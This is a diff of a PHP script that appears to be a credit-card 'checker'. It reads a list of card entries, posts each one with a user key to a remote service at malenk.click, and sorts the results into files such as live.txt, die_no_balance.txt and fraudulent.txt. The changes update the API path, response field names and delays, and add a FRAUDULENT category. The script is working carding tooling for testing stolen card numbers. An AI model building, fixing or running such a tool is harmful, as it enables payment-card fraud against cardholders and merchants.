@@ -33,7 +33,7 @@ if(!is_dir($readConfig['result_dir'])) {
 
 $i=0;
 do {
-    $isValidKeys = curl("https://malenk.click/api/?version=1.0", json_encode(['type' => 'validate_userkey', 'data' => ['userkey' => $readConfig['userkey'] ]]));
+    $isValidKeys = curl("https://malenk.click/apii/?version=1.0", json_encode(['type' => 'validate_userkey', 'data' => ['userkey' => $readConfig['userkey'] ]]));
     if(isJson($isValidKeys)) {
         if(json_decode($isValidKeys, true)['error'] == false) {
             echo "[-] Key is ".$colors->getColoredString("VALID").PHP_EOL;
@@ -88,13 +88,13 @@ $content = explode("\n", trim(file_get_contents($newPath)));
 $lineNow = 1;
 foreach($content as $format) {
     checking:
-    $check = curl("https://malenk.click/api/?version=1.0", json_encode(['type' => 'check','data' => ['userkey' => $readConfig['userkey'], 'type_check' => $readConfig['type_check'], 'cclist' => trim($format)]]));
+    $check = curl("https://malenk.click/apii/?version=1.0", json_encode(['type' => 'check','data' => ['userkey' => $readConfig['userkey'], 'type_check' => $readConfig['type_check'], 'cclist' => trim($format)]]));
     if(isJson($check)) {
         if(json_decode($check,1)['status'] == "LIVE") {
-            echo "[".date("H:i:s")." ".$lineNow." / ".count($content)."] ".trim($format)." => ".json_decode($check,1)['bin_info']." [".$colors->getColoredString("LIVE", "white", "green")."] [CREDIT : ".$colors->getColoredString(json_decode($check,1)['credit'], "white", "green")."] [Check Type : ".json_decode($check,1)['check_type']."]".PHP_EOL;
+            echo "[".date("H:i:s")." ".$lineNow." / ".count($content)."] ".trim($format)." => ".json_decode($check,1)['bin_info']." [".$colors->getColoredString("LIVE", "white", "green")."] [CREDIT : ".$colors->getColoredString(json_decode($check,1)['credits'], "white", "green")."] [Check Type : ".json_decode($check,1)['info']."]".PHP_EOL;
             file_put_contents($readConfig['result_dir']."/live.txt", trim($format)." | ".json_decode($check,1)['bin_info']."".PHP_EOL, FILE_APPEND);
 			file_put_contents($readConfig['result_dir']."/livenoinfobin.txt", trim($format)."".PHP_EOL, FILE_APPEND);
-            sleep(3);
+            sleep(15);
         } else if(json_decode($check,1)['status'] == "UNKNOWN") {
             $addMsg = "";
             if(isset(json_decode($check,1)['message'])) {
@@ -105,7 +105,7 @@ foreach($content as $format) {
                 file_put_contents($readConfig['result_dir']."/unknown.txt", $format.PHP_EOL, FILE_APPEND);
             } else if(@json_decode($check,1)['try_recheck'] == true) {
                 echo "== ".trim($format)." => ".$colors->getColoredString("UNKNOWN", "yellow")." Wait for re-check from system. ".$addMsg.PHP_EOL;
-                sleep(3);
+                sleep(15);
                 goto checking;
             } else {
                 file_put_contents("err.log", $check.PHP_EOL, FILE_APPEND);
@@ -117,17 +117,21 @@ foreach($content as $format) {
             file_put_contents("uncheck.log", $check.PHP_EOL, FILE_APPEND);
             echo "== ".trim($format)." => ".$colors->getColoredString("UNCHECK", "yellow")." ".$colors->getColoredString(json_decode($check,1)['message'], "red").PHP_EOL;
         } else {
-            if(@json_decode($check, 1)['decline_code'] == 'transaction_not_allowed') {
+            if(@json_decode($check, 1)['info'] == 'TRANSACTION_NOT_ALLOWED') {
                 file_put_contents($readConfig['result_dir']."/unknown_not_supported.txt", trim($format).PHP_EOL, FILE_APPEND);
-            } else if(json_decode($check,1)['decline_code'] == 'insufficient_funds') {
+            } else if(json_decode($check,1)['info'] == 'INSUFFICIENT_FUNDS') {
                 file_put_contents($readConfig['result_dir']."/die_no_balance.txt", trim($format).PHP_EOL, FILE_APPEND);
+            } else if(json_decode($check,1)['info'] == 'FRAUDULENT') {
+                file_put_contents($readConfig['result_dir']."/fraudulent.txt", trim($format).PHP_EOL, FILE_APPEND);
             } else if(json_decode($check,1)['message'] == "Invalid object") {
                 goto checking;
             } else {
                 file_put_contents($readConfig['result_dir']."/die.txt", trim($format).PHP_EOL, FILE_APPEND);
             }
-            $declineCode = json_decode($check,1)['decline_code'] !== null ? "(".$colors->getColoredString(json_decode($check,1)['decline_code'], "white", "red").")" : ''; 
-            echo "[".date("H:i:s")." ".$lineNow." / ".count($content)."] ".trim($format)." => ".$colors->getColoredString(json_decode($check,1)['status'], "white", "red")." | ".$colors->getColoredString(json_decode($check,1)['message'], "red")." ".$declineCode." [CREDIT : ".$colors->getColoredString(json_decode($check,1)['credit'], "white", "green")."] [Check Type : ".json_decode($check,1)['check_type']."]".PHP_EOL;
+            $declineCode = json_decode($check,1)['info'] !== null ? "(".$colors->getColoredString(json_decode($check,1)['info'], "white", "red").")" : ''; 
+            echo "[".date("H:i:s")." ".$lineNow." / ".count($content)."] ".trim($format)." => ".$colors->getColoredString(json_decode($check,1)['status'], "white", "red")." | ".$colors->getColoredString(json_decode($check,1)['message'], "red")." ".$declineCode." [CREDIT : ".$colors->getColoredString(json_decode($check,1)['credits'], "white", "green")."] [Check Type : ".json_decode($check,1)['info']."]".PHP_EOL;
+            
+            
         }
     } else {
         #file_put_contents("err.log", $check.PHP_EOL, FILE_APPEND);
